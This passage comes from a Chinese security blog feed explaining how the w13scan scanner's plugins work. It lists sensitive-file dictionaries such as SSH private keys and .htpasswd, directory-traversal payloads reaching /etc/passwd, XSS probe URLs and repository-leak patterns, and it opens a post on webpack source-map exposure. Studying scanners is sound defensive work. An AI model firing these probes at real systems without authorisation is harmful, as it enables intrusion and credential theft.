<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#1-%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%EF%BC%9A">一篇文章带你理解漏洞之 Python 反序列化漏洞</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/aef2ae0498df">SSTI模板注入</a></p>
</li>
<li class="lvl-2">
<p><a href="https://x.hacking8.com/post-356.html">写在w13scan第一阶段</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>w13scan-扫描插件总结-PerFolder</title>
    <url>/2019/7544.html</url>
    <content><![CDATA[<h1>整体流程图</h1>
<p><img src="https://i.loli.net/2019/12/17/b27hPyBAzm3vN5g.png" alt="W13SCAN-DESIGN.jpg" /></p>
<hr />
<h2 id="PerFolder-每个目录">PerFolder (每个目录)</h2>
<p>比如有一个url为:<code>http://xxxxxxxx/imcloud/static/seat/build/images/pic.jpg</code></p>
<p>拆解后的目录为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.125.20.39/</span><br><span class="line">http://10.125.20.39/imcloud/</span><br><span class="line">http://10.125.20.39/imcloud/static/</span><br><span class="line">http://10.125.20.39/imcloud/static/seat/</span><br><span class="line">http://10.125.20.39/imcloud/static/seat/build/</span><br><span class="line">http://10.125.20.39/imcloud/static/seat/build/images/</span><br></pre></td></tr></table></figure>
<p>然后以这些目录url为基础,拼接url去扫描</p>
<hr />
<h3 id="备份文件扫描">备份文件扫描:</h3>
<p>原理:</p>
<p>获取来自服务器的原始套接字响应即通过文件头来识别。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">&#x27;https://api.github.com/events&#x27;</span>, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw</span><br><span class="line">&lt;requests.packages.urllib3.response.HTTPResponse <span class="built_in">object</span> at <span class="number">0x101194810</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw.read(<span class="number">10</span>)</span><br><span class="line"><span class="string">&#x27;\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上网找了一个rar,试了一下输出的文件头是<code>b'PK\x03\x04\x14\x00\x00\x00\x08\x00'</code></p>
<p>插件里的注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* rar:526172211a0700cf9073</span><br><span class="line">* zip:504b0304140000000800</span><br><span class="line">* gz：1f8b080000000000000b</span><br><span class="line">* tar.gz: 1f8b0800</span><br></pre></td></tr></table></figure>
<p>不同后缀的文件有不同的文件头特征.</p>
<p>有一份简单的备份文件的字典列表,<code>'bak.rar', 'bak.zip', 'backup.rar', 'backup.zip', 'www.zip', 'www.rar', 'web.rar', 'web.zip',                     'wwwroot.rar',                     'wwwroot.zip', 'log.zip', 'log.rar'</code></p>
<blockquote>
<p>字典这玩意可大可小</p>
</blockquote>
<p>通过拼接url,如果<code>status_code</code>是200而且文件头符合,则判断为扫出了备份文件。</p>
<hr />
<h3 id="目录遍历">目录遍历:</h3>
<p><img src="https://i.loli.net/2019/12/18/v1jFySAURNh76Cm.jpg" alt="" /></p>
<p>找出一些常见的目录遍历的页面,html源码中有这些特征</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;directory listing for&quot;</span><br><span class="line"></span><br><span class="line">&quot;&lt;title&gt;directory&quot;</span><br><span class="line"></span><br><span class="line">&quot;&lt;head&gt;&lt;title&gt;index of&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&lt;table summary=&quot;directory listing&quot;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;last modified&lt;/a&gt;&#x27;</span><br></pre></td></tr></table></figure>
<p>如果在返回包的源码中发现这些特征,则判断这个页面有目录遍历漏洞。</p>
<hr />
<h3 id="敏感文件扫描">敏感文件扫描:</h3>
<p>敏感文件字典采集于bbscan</p>
<p>总的敏感文件有以下这些</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/config.inc</span><br><span class="line">/config.php.bak</span><br><span class="line">/db.php.bak</span><br><span class="line">/conf/config.ini</span><br><span class="line">/config.ini</span><br><span class="line">/config/config.ini</span><br><span class="line">/configuration.ini</span><br><span class="line">/configs/application.ini</span><br><span class="line">/settings.ini</span><br><span class="line">/application.ini</span><br><span class="line">/conf.ini</span><br><span class="line">/app.ini</span><br><span class="line">/config.json</span><br><span class="line">/a.out</span><br><span class="line">/key</span><br><span class="line">/keys</span><br><span class="line">/key.txt</span><br><span class="line">/temp.txt</span><br><span class="line">/tmp.txt</span><br><span class="line">/php.ini</span><br><span class="line">/sftp-config.json</span><br><span class="line">/index.php.bak</span><br><span class="line">/.index.php.swp</span><br><span class="line">/index.cgi.bak</span><br><span class="line">/config.inc.php.bak</span><br><span class="line">/.config.inc.php.swp</span><br><span class="line">/config/.config.php.swp</span><br><span class="line">/.config.php.swp</span><br><span class="line">/.settings.php.swp</span><br><span class="line">/.database.php.swp</span><br><span class="line">/.db.php.swp</span><br><span class="line">/.mysql.php.swp</span><br><span class="line">/readme</span><br><span class="line">/README</span><br><span class="line">/readme.md</span><br><span class="line">/readme.html</span><br><span class="line">/changelog.txt</span><br><span class="line">/%e6%9b%b4%e6%96%b0%e6%97%a5%e5%bf%97.txt</span><br><span class="line">/www.log</span><br><span class="line">/error.log</span><br><span class="line">/log.log</span><br><span class="line">/sql.log</span><br><span class="line">/errors.log</span><br><span class="line">/db.log</span><br><span class="line">/data.log</span><br><span class="line">/app.log</span><br><span class="line">/ntunnel_mysql.php</span><br></pre></td></tr></table></figure>
<p>实际上的字典的格式为<code>&#123;'path': '/config.inc', 'tag': '', 'content-type': '', 'content-type_no': 'html'&#125;</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>tag</code>: html源码特征</p>
</li>
<li class="lvl-2">
<p><code>content-type</code>: 文件拓展名</p>
</li>
<li class="lvl-2">
<p><code>content-type_no</code>: 文件拓展名黑名单</p>
</li>
</ul>
<p>原理:</p>
<p>拼接url,发包访问,返回码为200且同时满足以下3种条件</p>
<ol>
<li class="lvl-3">
<p>符合html源码特征</p>
</li>
<li class="lvl-3">
<p>符合文件拓展名</p>
</li>
<li class="lvl-3">
<p>不在文件拓展名黑名单</p>
</li>
</ol>
<hr />
<h3 id="idea-工作目录解析">.idea 工作目录解析:</h3>
<p>原理:</p>
<p>url拼接上<code>/.idea/workspace.xml</code></p>
<p>如果返回包源码中能正则匹配到<code>&lt;project version=&quot;\w+&quot;&gt;</code>，正则匹配版本号,则判定为 JetBrans .idea 泄漏.</p>
<hr />
<h3 id="phpinfo探测解析">phpinfo探测解析:</h3>
<p>字典为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;phpinfo.php&quot;,</span><br><span class="line">&quot;pi.php&quot;,</span><br><span class="line">&quot;php.php&quot;,</span><br><span class="line">&quot;i.php&quot;,</span><br><span class="line">&quot;test.php&quot;,</span><br><span class="line">&quot;temp.php&quot;,</span><br><span class="line">&quot;info.php&quot;,</span><br></pre></td></tr></table></figure>
<p>原理:</p>
<p>拼接Url,发包访问,如果返回包中含<code>&lt;title&gt;phpinfo()&lt;/title&gt;</code>, 则判定为存在phpinfo文件</p>
<hr />
<h3 id="git-svn-bzr-hg泄漏">git svn bzr hg泄漏:</h3>
<p>字典为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = &#123;</span><br><span class="line">    <span class="string">&quot;/.svn/all-wcprops&quot;</span>: <span class="string">&quot;svn:wc:ra_dav:version-url&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/.git/config&quot;</span>: <span class="string">&#x27;repositoryformatversion[\s\S]*&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;/.bzr/README&quot;</span>: <span class="string">&#x27;This\sis\sa\sBazaar[\s\S]&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/CVS/Root&#x27;</span>: <span class="string">&#x27;:pserver:[\s\S]*?:[\s\S]*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/.hg/requires&#x27;</span>: <span class="string">&#x27;^revlogv1.*&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>键为文件路径,值为正则匹配规则。</p>
<p>拼接url, 正则匹配返回包内容,匹配成功则判定为目录下有仓库源码泄漏漏洞</p>
<hr />
<h3 id="Sftp探测">Sftp探测:</h3>
<p>字典:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sftp-config.json</span><br><span class="line">/recentservers.xml</span><br></pre></td></tr></table></figure>
<p>正则匹配</p>
<p><code>(&quot;type&quot;:[\s\S]*?&quot;host&quot;:[\s\S]*?&quot;user&quot;:[\s\S]*?</code></p>
<p><code>&quot;password&quot;:[\s\S]*&quot;)</code>,<code>(&lt;Pass&gt;[\s\S]*?&lt;\/Pass&gt;)</code></p>
<p>匹配到则认为找到sftp</p>
<hr />
<h3 id="WEB编辑器探测">WEB编辑器探测:</h3>
<p>规则格式和判定方式和敏感文件扫描一样。</p>
<p>规则格式:<code>&#123;'path': '/fckeditor/_samples/default.html', 'tag': '&lt;title&gt;FCKeditor', 'content-type': 'html',                      'content-type_no': ''&#125;</code></p>
<p>原理:</p>
<p>拼接url,发包访问,返回码为200且同时满足以下3种条件</p>
<ol>
<li class="lvl-3">
<p>符合html源码特征</p>
</li>
<li class="lvl-3">
<p>符合文件拓展名</p>
</li>
<li class="lvl-3">
<p>不在文件拓展名黑名单</p>
</li>
</ol>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/w-digital-scanner/w13scan/blob/master/README_CN.md">w13scan</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>w13scan-扫描插件总结-PerScheme</title>
    <url>/2019/59261.html</url>
    <content><![CDATA[<h1>整体流程图</h1>
<p><img src="https://i.loli.net/2019/12/17/b27hPyBAzm3vN5g.png" alt="W13SCAN-DESIGN.jpg" /></p>
<hr />
<h2 id="PerScheme-每个域名">PerScheme (每个域名)</h2>
<p>如有url:<code>www.baidu.com/aaa/a.php</code></p>
<p>取其中的域名<code>www.baidu.com</code>为基础</p>
<p>其实就是相当于web的根目录</p>
<hr />
<h3 id="基于域名备份文件">基于域名备份文件:</h3>
<p>原理:</p>
<p>以域名的信息作为构造备份文件url的基础.</p>
<p>例如url: <code>www.baidu.com</code></p>
<p>则会构造出以下url去发包:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com/www.rar</span><br><span class="line">www.baidu.com/www.zip</span><br><span class="line">www.baidu.com/baidu.rar</span><br><span class="line">www.baidu.com/baidu.zip</span><br><span class="line">www.baidu.com/com.rar</span><br><span class="line">www.baidu.com/com.zip</span><br></pre></td></tr></table></figure>
<p>判定方式为 文件头特征。</p>
<hr />
<h3 id="通用敏感文件扫描">通用敏感文件扫描:</h3>
<p>字典收集自BBScan的插件,如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/core</span><br><span class="line">/crossdomain.xml</span><br><span class="line">/debug.txt</span><br><span class="line">/.bash_history</span><br><span class="line">/.rediscli_history</span><br><span class="line">/.bashrc</span><br><span class="line">/.bash_profile</span><br><span class="line">/.bash_logout</span><br><span class="line">/.vimrc</span><br><span class="line">/.DS_Store</span><br><span class="line">/.history</span><br><span class="line">/.htaccess</span><br><span class="line">/htaccess.bak</span><br><span class="line">/.htpasswd</span><br><span class="line">/.htpasswd.bak</span><br><span class="line">/htpasswd.bak</span><br><span class="line">/nohup.out</span><br><span class="line">/.mysql_history</span><br><span class="line">/httpd.conf</span><br><span class="line">/web.config</span><br><span class="line">/server-status</span><br><span class="line">/solr/</span><br><span class="line">/examples/</span><br><span class="line">/examples/servlets/servlet/SessionExample</span><br><span class="line">/config/database.yml</span><br><span class="line">/database.yml</span><br><span class="line">/db.conf</span><br><span class="line">/db.ini</span><br><span class="line">/jmx-console/HtmlAdaptor</span><br><span class="line">/cacti/</span><br><span class="line">/zabbix/</span><br><span class="line">/jenkins/static/f3a41d2f/css/style.css</span><br><span class="line">/static/f3a41d2f/css/style.css</span><br><span class="line">/script</span><br><span class="line">/jenkins/script</span><br><span class="line">/exit</span><br><span class="line">/memadmin/index.php</span><br><span class="line">/phpmyadmin/index.php</span><br><span class="line">/phpMyAdmin/index.php</span><br><span class="line">/_phpmyadmin/index.php</span><br><span class="line">/pma/index.php</span><br><span class="line">/ganglia/</span><br><span class="line">/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/profile</span><br><span class="line">/resin-doc/viewfile/?contextpath=/&amp;servletpath=&amp;file=index.jsp</span><br><span class="line">/resin-admin/</span><br><span class="line">/.ssh/known_hosts</span><br><span class="line">/.ssh/id_rsa</span><br><span class="line">/id_rsa</span><br><span class="line">/.ssh/id_rsa.pub</span><br><span class="line">/.ssh/id_dsa</span><br><span class="line">/id_dsa</span><br><span class="line">/.ssh/id_dsa.pub</span><br><span class="line">/.ssh/authorized_keys</span><br><span class="line">/data.txt</span><br><span class="line">/install.txt</span><br><span class="line">/INSTALL.TXT</span><br><span class="line">/upload.do</span><br><span class="line">/upload.jsp</span><br><span class="line">/upload.php</span><br><span class="line">/upfile.php</span><br><span class="line">/upload.html</span><br></pre></td></tr></table></figure>
<p>规则格式和判定方式和Perfolder里的敏感文件扫描一样。</p>
<p>规则格式:<code>&#123;'path': '/core', 'tag': 'ELF', 'content-type': '', 'content-type_no': ''&#125;</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>tag</code>: html源码特征</p>
</li>
<li class="lvl-2">
<p><code>content-type</code>: 文件拓展名</p>
</li>
<li class="lvl-2">
<p><code>content-type_no</code>: 文件拓展名黑名单</p>
</li>
</ul>
<p>原理:</p>
<p>拼接url,发包访问,返回码为200且同时满足以下3种条件</p>
<ol>
<li class="lvl-3">
<p>符合html源码特征</p>
</li>
<li class="lvl-3">
<p>符合文件拓展名</p>
</li>
<li class="lvl-3">
<p>不在文件拓展名黑名单</p>
</li>
</ol>
<hr />
<h3 id="目录穿越扫描">目录穿越扫描:</h3>
<p>字典收集自BBScan的插件,如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/proc/meminfo</span><br><span class="line">/etc/profile</span><br><span class="line">/file:///etc/passwd</span><br><span class="line">/../../../../../../../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">/../../../../../../../../../../../../../etc/profile</span><br><span class="line"></span><br><span class="line">//././././././././././././././././././././././././../../../../../../../../etc/profile</span><br><span class="line"></span><br><span class="line">/aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/profile</span><br><span class="line"></span><br><span class="line">/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/profile</span><br><span class="line"></span><br><span class="line">/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</span><br><span class="line"></span><br><span class="line">/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd</span><br><span class="line"></span><br><span class="line">/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</span><br><span class="line"></span><br><span class="line">/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd</span><br></pre></td></tr></table></figure>
<p>规则格式和判定方式和Perfolder里的敏感文件扫描一样。</p>
<p>规则格式:<code>&#123;'path': '/etc/passwd', 'tag': 'root:x:', 'content-type': '', 'content-type_no': ''&#125;</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>tag</code>: html源码特征</p>
</li>
<li class="lvl-2">
<p><code>content-type</code>: 文件拓展名</p>
</li>
<li class="lvl-2">
<p><code>content-type_no</code>: 文件拓展名黑名单</p>
</li>
</ul>
<p>原理:</p>
<p>拼接url,发包访问,返回码为200且同时满足以下3种条件</p>
<ol>
<li class="lvl-3">
<p>符合html源码特征</p>
</li>
<li class="lvl-3">
<p>符合文件拓展名</p>
</li>
<li class="lvl-3">
<p>不在文件拓展名黑名单</p>
</li>
</ol>
<hr />
<h3 id="dz-xss探测">dz xss探测:</h3>
<p>路径:<code>static/image/common/flvplayer.swf?file=1.flv&amp;linkfromdisplay=true&amp;link=javascript:alert(document.cookie);</code></p>
<p>判定依据: 状态码200 且 源码含<code>CWS</code>这个字符串</p>
<p>路径:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = [<span class="string">&#x27;config/config_ucenter.php.bak&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;config/.config_ucenter.php.swp&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;config/.config_global.php.swp&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;config/config_global.php.1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;uc_server/data/config.inc.php.bak&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;config/config_global.php.bak&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;include/config.inc.php.tmp&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>判定依据: 状态码200或206 且 源码含<code>&lt;?php</code>这个字符串</p>
<p>路径:<code>static/image/admincp/getcolor.htm'</code></p>
<p>判定依据:源码含<code>if(fun) eval('parent.'+fun+'</code></p>
<hr />
<h3 id="错误页面信息泄漏">错误页面信息泄漏:</h3>
<p>访问一个不存在的错误页面，可以从这个页面中获取一些信息</p>
<p>随机生成一个url: <code>www.xxxx.com/随机字符串.jsp</code>,去访问</p>
<p>然后去正则匹配看是以下哪一类:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>ASPNETPathDisclosure</code></p>
</li>
<li class="lvl-2">
<p><code>Struts2DevMod</code></p>
</li>
<li class="lvl-2">
<p><code>Django DEBUG MODEL</code></p>
</li>
<li class="lvl-2">
<p><code>RailsDevMode</code></p>
</li>
<li class="lvl-2">
<p><code>RequiredParameter</code></p>
</li>
<li class="lvl-2">
<p><code>Thinkphp3 Debug</code></p>
</li>
</ul>
<p>正则规则如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re_list = &#123;</span><br><span class="line">    <span class="string">&quot;ASPNETPathDisclosure&quot;</span>: <span class="string">&quot;&lt;title&gt;Invalid\sfile\sname\sfor\smonitoring:\s&#x27;([^&#x27;]*)&#x27;\.\sFile\snames\sfor\smonitoring\smust\shave\sabsolute\spaths\,\sand\sno\swildcards\.&lt;\/title&gt;&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;Struts2DevMod&quot;</span>: <span class="string">&quot;You are seeing this page because development mode is enabled.  Development mode, or devMode, enables extra&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;Django DEBUG MODEL&quot;</span>: <span class="string">&quot;You&#x27;re seeing this error because you have &lt;code&gt;DEBUG = True&lt;\/code&gt; in&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;RailsDevMode&quot;</span>: <span class="string">&quot;&lt;title&gt;Action Controller: Exception caught&lt;\/title&gt;&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;RequiredParameter&quot;</span>: <span class="string">&quot;Required\s\w+\sparameter\s&#x27;([^&#x27;]+?)&#x27;\sis\snot\spresent&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;Thinkphp3 Debug&quot;</span>: <span class="string">&#x27;&lt;p class=&quot;face&quot;&gt;:\(&lt;/p&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr />
<h3 id="flash-xss探测">flash xss探测:</h3>
<p>文件字典如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">common/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">adminsoft/js/swfupload.swf</span><br><span class="line"></span><br><span class="line">statics/js/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">images/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">js/upload/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">addons/theme/stv1/_static/js/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">admin/kindeditor/plugins/multiimage/images/swfupload.swf</span><br><span class="line"></span><br><span class="line">includes/js/upload.swf</span><br><span class="line">js/swfupload/swfupload.swf</span><br><span class="line">Plus/swfupload/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf</span><br><span class="line"></span><br><span class="line">include/lib/js/uploadify/uploadify.swf</span><br><span class="line">lib/swf/swfupload.swf</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终url为 <code>www.xxx.com/xxx.swf?movieName=%22]%29&#125;catch%28e%29&#123;if%28!window.x%29&#123;window.x=1;alert%28%22xss%22%29&#125;&#125;//</code></p>
<p>访问,再通过md5来判断.</p>
<hr />
<h3 id="iis解析漏洞">iis解析漏洞:</h3>
<p>url : <code>domain/robots.txt/.php</code></p>
<p>判定依据: <code>user-agent</code>在源码 和 <code>Content-Type</code>不含<code>text/plain</code></p>
<hr />
<h3 id="java-web目录探测">java web目录探测</h3>
<p>路径字典:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/web.xml</span><br><span class="line">/WEB-INF/web.xml.bak</span><br><span class="line">/WEB-INF/applicationContext.xml</span><br><span class="line">/WEB-INF/config.xml</span><br><span class="line">/WEB-INF/spring.xml</span><br><span class="line">/WEB-INF/struts-config.xml</span><br><span class="line">/WEB-INF/struts-front-config.xml</span><br><span class="line">/WEB-INF/struts/struts-config.xml</span><br><span class="line">/WEB-INF/classes/spring.xml</span><br><span class="line">/WEB-INF/classes/struts.xml</span><br><span class="line">/WEB-INF/classes/struts_manager.xml</span><br><span class="line">/WEB-INF/classes/conf/datasource.xml</span><br><span class="line">/WEB-INF/classes/data.xml</span><br><span class="line">/WEB-INF/classes/config/applicationContext.xml</span><br><span class="line">/WEB-INF/classes/applicationContext.xml</span><br><span class="line">/WEB-INF/classes/conf/spring/applicationContext-datasource.xml</span><br><span class="line">/WEB-INF/config/db/dataSource.xml</span><br><span class="line">/WEB-INF/spring-cfg/applicationContext.xml</span><br><span class="line">/WEB-INF/dwr.xml</span><br><span class="line">/WEB-INF/classes/hibernate.cfg.xml</span><br><span class="line">/WEB-INF/classes/rabbitmq.xml</span><br><span class="line">/WEB-INF/conf/activemq.xml</span><br><span class="line">/server.xml</span><br><span class="line">/config/database.yml</span><br><span class="line">/configprops</span><br><span class="line">/WEB-INF/database.properties</span><br><span class="line">/WEB-INF/web.properties</span><br><span class="line">/WEB-INF/log4j.properties</span><br><span class="line">/WEB-INF/classes/dataBase.properties</span><br><span class="line">/WEB-INF/classes/application.properties</span><br><span class="line">/WEB-INF/classes/jdbc.properties</span><br><span class="line">/WEB-INF/classes/db.properties</span><br><span class="line">/WEB-INF/classes/conf/jdbc.properties</span><br><span class="line">/WEB-INF/classes/security.properties</span><br><span class="line">/WEB-INF/conf/database_config.properties</span><br><span class="line">/WEB-INF/config/dbconfig</span><br></pre></td></tr></table></figure>
<p>规则格式和判定方式和Perfolder里的敏感文件扫描一样。</p>
<p>规则格式:<code>&#123;'path': '/WEB-INF/web.xml', 'tag': '&lt;?xml', 'content-type': 'xml', 'content-type_no': ''</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>tag</code>: html源码特征</p>
</li>
<li class="lvl-2">
<p><code>content-type</code>: 文件拓展名</p>
</li>
<li class="lvl-2">
<p><code>content-type_no</code>: 文件拓展名黑名单</p>
</li>
</ul>
<p>原理:</p>
<p>拼接url,发包访问,返回码为200且同时满足以下3种条件</p>
<ol>
<li class="lvl-3">
<p>符合html源码特征</p>
</li>
<li class="lvl-3">
<p>符合文件拓展名</p>
</li>
<li class="lvl-3">
<p>不在文件拓展名黑名单</p>
</li>
</ol>
<hr />
<h3 id="敏感目录探测">敏感目录探测</h3>
<p>字典:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">folders = [<span class="string">&#x27;/admin&#x27;</span>, <span class="string">&#x27;/bak&#x27;</span>, <span class="string">&#x27;/backup&#x27;</span>, <span class="string">&#x27;/conf&#x27;</span>, <span class="string">&#x27;/config&#x27;</span>, <span class="string">&#x27;/db&#x27;</span>, <span class="string">&#x27;/debug&#x27;</span>, <span class="string">&#x27;/data&#x27;</span>, <span class="string">&#x27;/database&#x27;</span>, <span class="string">&#x27;/deploy&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;/WEB-INF&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;/install&#x27;</span>, <span class="string">&#x27;/manage&#x27;</span>, <span class="string">&#x27;/manager&#x27;</span>, <span class="string">&#x27;/monitor&#x27;</span>, <span class="string">&#x27;/tmp&#x27;</span>, <span class="string">&#x27;/temp&#x27;</span>, <span class="string">&#x27;/test&#x27;</span>]</span><br></pre></td></tr></table></figure>
<hr />
<h3 id="wordpress-备份文件">wordpress 备份文件</h3>
<p>字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_lst = [<span class="string">&#x27;/wp-config.php.inc&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;/wp-config.inc&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;/wp-config.bak&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;/wp-config.php~&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;/.wp-config.php.swp&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;/wp-config.php.bak&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>判定依据: 状态码为200且 源码含<code>&lt;?php</code></p>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/w-digital-scanner/w13scan/blob/master/README_CN.md">w13scan</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>webpack带来的安全风险</title>
    <url>/2020/15590.html</url>
    <content><![CDATA[<h1>webpack:</h1>
<h2 id="什么是webpack">什么是webpack:</h2>
<p><strong>webpack用于编译JavaScript模块。</strong></p>
<p>关注javascript技术的同学一定知道，在CommonJS和ES6中，为了支持模块化，而引入了export/require/import这类东西，模块化可以降低开发的复杂度，用于支撑前端的复杂功能，但是模块化后，也带来了许多问题，比如老版本的浏览器不支持ES6/JSX语法，开发和线上不能保持一致，这就为WebPack类的自动化代码转换工具的出现提供了需求。</p>
<p><strong>WebPack可以看做是模块打包机：它做的事情是，分析你的项目结构，找到JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其转换和打包为合适的格式供浏览器使用。</strong></p>
<p>按照官网的说法，webpack可以打包一切资源/图片/样式/依赖等等，webpack默认只支持js模块打包，对于其他文件就需要用loader解析器，比如在vue中，直观的效果就是使用webpack可以将使用的vue，css，图片等打包成一个js。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200414114758.png" alt="20200414114758" /></p>
<hr />
<h1>Source Map:</h1>
<p>部署前端之前，开发者通常会对代码进行打包压缩，这样可以减少代码大小，从而有效提高访问速度。然而，压缩代码的报错信息是很难Debug的，因为它的行号和列号已经失真。这时就需要Source Map来还原真实的出错位置了。</p>
<h2 id="为啥变换代码">为啥变换代码?</h2>
<p>前端代码越来越复杂的情况下，开发者通常会使用webpack、UglifyJS2等工具对代码进行打包变换，这样可以减少代码大小，有效提高访问速度。关于变换代码的原因，这里不妨引用一下大神阮一峰的JavaScript Source Map 详解:</p>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>压缩，减小体积。比如jQuery 1.9的源码，压缩前是252KB，压缩后是32KB。</p>
</li>
<li class="lvl-2">
<p>多个文件合并，减少HTTP请求数。</p>
</li>
<li class="lvl-2">
<p>其他语言编译成JavaScript。最常见的例子就是CoffeeScript。</p>
</li>
</ul>
</blockquote>
<h2 id="如何变换代码">如何变换代码?</h2>
<p>下面是一个简单的“hello World”程序hello.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sayHello</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">&quot;Fundebug&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> greeting = <span class="string">&quot;Hello, &quot;</span> + <span class="title class_">Name</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(greeting);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">sayHello</span>();</span><br></pre></td></tr></table></figure>
